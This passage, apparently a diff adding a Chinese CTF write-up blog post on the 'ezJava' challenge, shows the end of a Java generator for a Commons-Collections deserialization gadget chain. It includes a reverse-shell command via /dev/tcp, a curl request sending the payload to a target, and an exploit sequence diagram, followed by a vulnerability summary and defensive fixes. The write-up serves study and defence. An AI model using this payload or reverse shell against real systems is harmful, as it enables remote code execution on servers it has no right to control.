class="hljs-title class_">Object</span>[]{<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{<span class="hljs-string">"bash"</span>, <span class="hljs-string">"-c"</span>, cmd}}),<br>        };<br><br>        <span class="hljs-comment">// 先用假链，防止构造过程中触发 RCE</span><br>        Transformer[] fakeChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">"nothing"</span>)<br>        };<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeChain);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, chain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">"x"</span>);<br><br>        <span class="hljs-comment">// 构造 HashSet（此时假链触发，无危害）</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        set.add(entry);<br><br>        <span class="hljs-comment">// 清空 LazyMap，使 "x" 这个 key 不存在</span><br>        <span class="hljs-comment">// 反序列化时 LazyMap.get("x") 将触发 factory.transform()</span><br>        lazyMap.clear();<br><br>        <span class="hljs-comment">// 通过反射替换为真链</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">"iTransformers"</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(chain, realChain);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(set);<br>        oos.close();<br><br>        <span class="hljs-type">byte</span>[] payload = baos.toByteArray();<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"payload.ser"</span>)) {<br>            fos.write(payload);<br>        }<br>        System.out.println(<span class="hljs-string">"[+] Payload: payload.ser ("</span><br>            + payload.length + <span class="hljs-string">" bytes)"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<h3><span id="43-%E7%BC%96%E8%AF%91%E4%B8%8E%E7%94%9F%E6%88%90">4.3 编译与生成</span></h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编译（需要 commons-collections 在 classpath）</span><br>javac -encoding UTF-8 -<span class="hljs-built_in">cp</span> BOOT-INF/lib/commons-collections-3.2.1.jar ExploitGen.java<br><br><span class="hljs-comment"># 生成测试 payload（写文件验证）</span><br>java -<span class="hljs-built_in">cp</span> <span class="hljs-string">".;BOOT-INF/lib/commons-collections-3.2.1.jar"</span> ExploitGen <span class="hljs-string">"whoami &gt; /tmp/pwned"</span><br><br><span class="hljs-comment"># 生成反弹 shell payload</span><br>java -<span class="hljs-built_in">cp</span> <span class="hljs-string">".;BOOT-INF/lib/commons-collections-3.2.1.jar"</span> ExploitGen \<br>  <span class="hljs-string">"bash -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1"</span><br></code></pre></td></tr></tbody></table></figure>
+
+<h3><span id="44-%E5%8F%91%E9%80%81%E6%94%BB%E5%87%BB">4.4 发送攻击</span></h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST http://&lt;target&gt;:8080/ \<br>  -H <span class="hljs-string">"Content-Type: application/octet-stream"</span> \<br>  --data-binary @payload.ser<br></code></pre></td></tr></tbody></table></figure>
+
+<h3><span id="45-%E5%88%A9%E7%94%A8%E6%97%B6%E5%BA%8F%E5%9B%BE">4.5 利用时序图</span></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Attacker                              Target (ezjava)<br>────────                              ────────────────<br>   │                                       │<br>   │  POST /  [payload.ser bytes]           │<br>   │─────────────────────────────────────→ │<br>   │                                       │ HelloController.deserialize()<br>   │                                       │<br>   │                                       │ new SafeObjectInputStream(bais)<br>   │                                       │<br>   │                                       │ ois.readObject()<br>   │                                       │   ├─ resolveClass("HashSet")      ✓<br>   │                                       │   ├─ resolveClass("TiedMapEntry")  ✓<br>   │                                       │   ├─ resolveClass("LazyMap")       ✓<br>   │                                       │   ├─ resolveClass("Class")         ✓<br>   │                                       │   ├─ resolveClass("...")           ✓<br>   │                                       │   │<br>   │                                       │   └─ HashSet.readObject()<br>   │                                       │       → HashMap.put()<br>   │                                       │         → TiedMapEntry.hashCode()<br>   │                                       │           → getValue()<br>   │                                       │             → LazyMap.get("x")<br>   │                                       │               → chain.transform()<br>   │                                       │                 → Class.forName(<br>   │                                       │                     "java.lang.Runtime")<br>   │                                       │                 → getRuntime()<br>   │                                       │                 → exec(cmd)<br>   │                                       │<br>   │  200 "deserialization success"        │<br>   │ ←──────────────────────────────────  │<br>   │                                       │<br>   │                                       │ 命令已在服务端执行<br>   │                                       │ /tmp/pwned 已创建<br>   │                                       │ 或反弹 shell 已建立<br></code></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2><span id="%E4%BA%94%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">五、漏洞总结</span></h2><h3><span id="51-%E6%BC%8F%E6%B4%9E%E6%B8%85%E5%8D%95">5.1 漏洞清单</span></h3><table>
+<thead>
+<tr>
+<th>编号</th>
+<th>漏洞类型</th>
+<th>严重程度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>VULN-1</td>
+<td><strong>CWE-502: 不安全反序列化</strong></td>
+<td>严重 (Critical)</td>
+<td><code>POST /</code> 端点直接对用户输入的字节流执行 <code>readObject()</code></td>
+</tr>
+<tr>
+<td>VULN-2</td>
+<td><strong>过滤绕过</strong></td>
+<td>高 (High)</td>
+<td><code>SafeObjectInputStream</code> 黑名单仅有 6 个前缀，且仅检查序列化流中的类名，运行时反射调用完全不经过检查</td>
+</tr>
+<tr>
+<td>VULN-3</td>
+<td><strong>已知漏洞依赖</strong></td>
+<td>高 (High)</td>
+<td><code>commons-collections:3.2.1</code> 是历史上最著名的反序列化 gadget 库，公认存在严重安全隐患</td>
+</tr>
+</tbody></table>
+<h3><span id="52-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">5.2 防御措施</span></h3><ol>
+<li><strong>根本修复</strong>：完全禁止对不受信数据的反序列化。如需序列化，改用 JSON/Protobuf 等安全格式。</li>
+<li><strong>如果必须使用 Java 序列化</strong>：<ul>
+<li>使用 <code>ObjectInputFilter</code>（Java 9+，Java 8u121+ 已 backport）设置全局过滤器，白名单只允许安全类</li>
+<li>不应使用黑名单，黑名单极易被绕过</li>
+</ul>
+</li>
+<li><strong>升级 commons-collections</strong>：3.2.2+ 版本默认关闭了危险的 <code>InvokerTransformer</code> 功能，或在项目中根本不使用该库</li>
+<li><strong>移除 SecurityManager 假安全感</strong>：<code>CustomSecurityManager</code> 仅限制网络出口，不能防御 RCE，反而造成”已防护”的错觉</li>
+</ol>
+</body></html>
+	</article>
+
+	 
+    <div class="kira-post-copyright">
+        <strong>本文作者：</strong>leng yuan<br>
+        <strong>本文链接：</strong><a href="https://leng-yuan.github.io/2026/05/05/ezJava%E5%A4%8D%E7%8E%B0/" title="https:&#x2F;&#x2F;leng-yuan.github.io&#x2F;2026&#x2F;05&#x2F;05&#x2F;ezJava复现&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;leng-yuan.github.io&#x2F;2026&#x2F;05&#x2F;05&#x2F;ezJava复现&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+  
+	<div class="kira-post-nav">
+		<nav class="post-nav">
+			
+		</nav>
+	</div>
+	
+	<div class="kira-post-meta kira-rainbow">
+		
+		
+	</div>
+	
+	<div class="kira-post-footer">
+		
+
+		
+	<div class="giscus"></div>
+  
+    <script src="https://giscus.app/client.js"
+      data-repo="-your github username-/-your giscus repo-"
+      data-repo-id="-your giscus repo ID-"
+      data-category="Announcements"
+      data-category-id="-giscus category id-"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="en"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async  
+    ></script>
+  
+
+	</div>
+	
+</div>
+
+				</div>
+			</div>
+			<div class="kira-right-column">
+	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
+		<button class="mdui-fab mdui-ripple">
+			<i class="kirafont icon-caret-up"></i>
+		</button>
+	</a>
+</div>
+
+		</div>
+	</body>
+</html>
